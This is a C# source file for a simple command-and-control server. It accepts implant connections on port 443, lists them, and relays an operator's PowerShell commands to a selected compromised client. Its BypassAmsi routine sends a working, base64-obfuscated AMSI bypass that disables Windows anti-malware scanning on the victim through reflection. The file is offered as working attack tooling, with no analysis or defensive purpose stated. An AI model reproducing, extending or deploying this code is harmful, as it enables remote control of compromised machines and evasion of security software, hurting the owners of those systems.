using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;


namespace RFC_SimpleRunspaceC2_Server
{
    internal class Program
    {
        static TCPServer tcpServer = new TCPServer(443);
        static Dictionary<string, TcpClient> clients = tcpServer.GetClients();
        static void Main(string[] args)
        {
            Process cmdInput = new Process();
            cmdInput.StartInfo.FileName = "cmd.exe";
            cmdInput.StartInfo.UseShellExecute = false;
            cmdInput.StartInfo.RedirectStandardOutput = true;
            Thread cmdThread = new Thread(() =>
            {
                while (true)
                {
                    Console.WriteLine("#> ");
                    string input = Console.ReadLine();
                    switch (input)
                    {
                        case "/?":
                        case "help":
                            case "?":
                            Menu();
                            break;
                        case string s when s.StartsWith("client "):
                            SelectClient(s.Split(' ')[1]);
                            break;
                        case "listclients":
                            ListClients();
                            break;
                        case "menu":
                            Menu();
                            break;
                        case "clear":
                            Console.Clear();
                            break;
                        case "exit":
                        case "quit":
                            return;
                        default:
                            Console.WriteLine("[!] Invalid option");
                            Menu();
                            break;
                    }
                }
            });
            cmdThread.Start();
            tcpServer.Start();
        }

        public static void Menu()
        {
            Console.WriteLine("\nOptions:");
            Console.WriteLine("\thelp\t\t\tprint menu options");
            Console.WriteLine("\tclient {clientid}\tselect client");
            Console.WriteLine("\tlistclients\t\tlist availible clients");
            Console.WriteLine("\tmenu\t\t\tprint menu options");
            Console.WriteLine("\tquit\t\t\tshutdown server");
        }

        public static void SelectClient(string clientId)
        {
            if (clients.ContainsKey(clientId))
            {
                TcpClient client = clients[clientId];
                bool quit = false;
                try
                {
                    do
                    {
                        Console.WriteLine($"{((IPEndPoint)client.Client.RemoteEndPoint)} >");
                        string command = Console.ReadLine();
                        switch (command)
                        {
                            case "!>menu":
                                Console.WriteLine("!>amsi - bypass amsi");
                                Console.WriteLine("!>kill - kill client");
                                Console.WriteLine("!>clear - clear console");
                                break;
                            case "!>amsi":
                                BypassAmsi(clientId);
                                break;
                            case "!>clear":
                                Console.Clear();
                                break;
                            case "!>kill":
                                tcpServer.CloseClient(clientId);
                                break;
                            case "":
                                Console.WriteLine("[!] Please enter a PowerShell command");
                                break;
                            case "exit":
                            case "quit":
                                quit = true;
                                break;
                            default:
                                tcpServer.SendCommand(clientId, command);
                                break;
                        }

                    } while (!quit);
                }
                catch (Exception)
                {
                    Console.WriteLine("[!] Client connection lost!!");
                }
            }
        }

        public static void ListClients()
        {
            if (clients?.Count > 0)
            {
                string format = "|{0,-55}|{1,25}|";
                Console.WriteLine(format, "Name", "Score");
                Console.WriteLine(new string('-', 83));
                foreach (KeyValuePair<string, TcpClient> client in clients)
                {
                    Console.WriteLine(format, client.Key, ((IPEndPoint)client.Value.Client.RemoteEndPoint).ToString());
                }
            }
            else
            {
                Console.WriteLine("[!] No connected clients!!");
            }
        }

        public static void BypassAmsi(string clientId)
        {
            string amsiBypass = "$t = [Ref].Assembly.GetTypes() | foreach {if ($_.Name -like \"*iUtils\") {$u=$_}};Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"JABmAHMAIAA9ACAAJAB1AC4ARwBlAHQARgBpAGUAbABkAHMAKAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApACAAfAAgAGYAbwByAGUAYQBjAGgAIAB7AGkAZgAgACgAJABfAC4ATgBhAG0AZQAgAC0AbABpAGsAZQAgACIAKgBJAG4AaQB0AEYAYQBpAGwAZQBkACIAKQAgAHsAJABmAD0AJABfAH0AfQA=\")));$f.SetValue($null,$true)";
            string command = RedirectOutput(amsiBypass);
            tcpServer.SendCommand(clientId, command);
        }

        public static string RedirectOutput(string command)
        {
            string wrappedCommand = $"$out = [System.Console]::Out; $StringWriter = New-Object System.IO.StringWriter; [System.Console]::SetOut($StringWriter); {command}; $StringWriter.ToString(); [System.Console]::SetOut($out);";
            return wrappedCommand;
        }
    }
}
